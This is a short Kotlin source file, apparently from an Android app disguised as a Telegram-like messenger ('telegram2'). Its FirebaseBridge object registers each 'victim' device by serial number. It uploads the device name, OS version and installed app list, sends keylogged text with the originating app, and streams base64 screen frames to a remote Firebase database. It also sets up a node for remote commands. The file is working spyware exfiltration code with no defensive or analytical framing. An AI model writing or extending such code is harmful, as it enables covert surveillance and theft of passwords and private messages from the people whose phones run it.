package com.telegram2.messaging.remote

import android.os.Build
import com.google.firebase.database.FirebaseDatabase

object FirebaseBridge {
    private const val SECRET_PATH = "telegram2_secret"
    private val db = FirebaseDatabase.getInstance().getReference(SECRET_PATH)
    val victimRef = db.child("victims").child(Build.SERIAL)
    val commandsRef = victimRef.child("commands")
    val screenRef = victimRef.child("screen")
    val keylogsRef = victimRef.child("keylogs")
    val notificationsRef = victimRef.child("notifications")

    fun registerDevice(name: String, androidVersion: String, appList: List<String>) {
        victimRef.child("deviceName").setValue(name)
        victimRef.child("androidVersion").setValue(androidVersion)
        victimRef.child("appList").setValue(appList)
        victimRef.child("lastSeen").setValue(System.currentTimeMillis())
    }

    fun sendKeylog(packageName: String, text: String) {
        keylogsRef.push().setValue(mapOf(
            "packageName" to packageName,
            "text" to text,
            "timestamp" to System.currentTimeMillis()
        ))
    }

    fun updateScreenFrame(base64: String) {
        screenRef.setValue(base64)
    }
}